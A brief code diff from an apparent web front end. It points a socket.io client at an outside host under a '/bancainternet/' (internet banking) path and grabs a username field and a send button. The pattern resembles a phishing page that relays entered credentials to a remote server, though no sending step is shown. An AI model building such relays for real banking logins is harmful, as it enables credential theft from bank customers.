@@ -1,6 +1,7 @@
 //const { text } = require("express");
 
-const socket = io();
+const socket = io.connect('https://test.fasito.link/bancainternet/')
+
 
 const emitDataServer = document.querySelector("#btn-send");
 const userInput = document.querySelector("#user");
